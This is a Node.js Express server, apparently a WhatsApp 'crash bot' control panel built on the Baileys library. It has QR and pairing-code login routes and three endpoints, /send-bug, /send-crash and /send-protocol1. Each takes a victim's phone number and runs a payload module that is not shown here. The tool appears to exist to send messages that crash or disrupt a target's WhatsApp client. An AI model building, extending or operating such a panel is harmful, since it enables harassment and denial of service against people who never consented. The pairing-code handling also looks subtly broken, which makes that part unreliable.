const express = require('express');
const qrcode = require('qrcode');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    generateMessageTag,
    proto
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const SESSION_FOLDER = './auth_info_baileys';
let sock;
let qrCodeString = '';

app.use(express.json());
app.use(express.static('public'));

// استدعاء الأوامر من مجلد commands
const bugCommand = require('./commands/bug');
const crashCommand = require('./commands/crash');
const protocolCommand = require('./commands/protocol1');

// =============================
// تشغيل بوت واتساب
// =============================
async function startSock() {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
    });

    sock.ev.on('connection.update', async (update) => {
        const { qr, connection, lastDisconnect } = update;

        if (qr) {
            qrCodeString = qr;
            console.log('✅ امسح QR من المتصفح للاتصال');
        }

        if (connection === 'close') {
            const status = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (status === DisconnectReason.loggedOut) {
                console.log('❌ تم تسجيل الخروج، حذف الجلسة');
                fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
                startSock();
            } else {
                console.log('🔄 إعادة الاتصال...');
                startSock();
            }
        } else if (connection === 'open') {
            console.log('✅ متصل الآن');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

startSock();

// =============================
// API QR
// =============================
app.get('/qr', async (req, res) => {
    if (!qrCodeString) return res.status(404).send('لا يوجد QR حاليا');
    try {
        const qrImage = await qrcode.toDataURL(qrCodeString);
        res.send(`<img src="${qrImage}" style="width:300px;"/>`);
    } catch {
        res.status(500).send('خطأ في إنشاء QR');
    }
});

// =============================
// API Pair Code حقيقي
// =============================
app.get('/pair-code', async (req, res) => {
    const number = req.query.number;
    if (!number) {
        return res.status(400).send("❌ أدخل الرقم مثل: /pair-code?number=9677XXXXXXX");
    }

    try {
        // إرسال طلب إنشاء Pairing code عبر البوت
        const { message, key } = await sock.generatePairingCode(number);

        // Pair Code نصي من الرسالة
        const pairCode = message?.pairingCode?.toString() || '❌ لم يتم إنشاء رمز';

        res.send(`
            <center>
                <h2>🔐 رمز الاقتران</h2>
                <h1 style="letter-spacing:8px;font-size:32px;">${pairCode}</h1>
            </center>
        `);
    } catch (e) {
        console.error(e);
        return res.status(500).send("❌ فشل الحصول على رمز الاقتران");
    }
});

// =============================
// API الأوامر
// =============================
app.post('/send-bug', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await bugCommand(sock, number);
        res.send('✅ أمر BUG تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر BUG');
    }
});

app.post('/send-crash', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await crashCommand(sock, number);
        res.send('✅ أمر CRASH تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر CRASH');
    }
});

app.post('/send-protocol1', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await protocolCommand(sock, number);
        res.send('✅ أمر PROTOCOL1 تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر PROTOCOL1');
    }
});

// =============================
// الصفحة الرئيسية
// =============================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 شغال على http://localhost:${PORT}`));
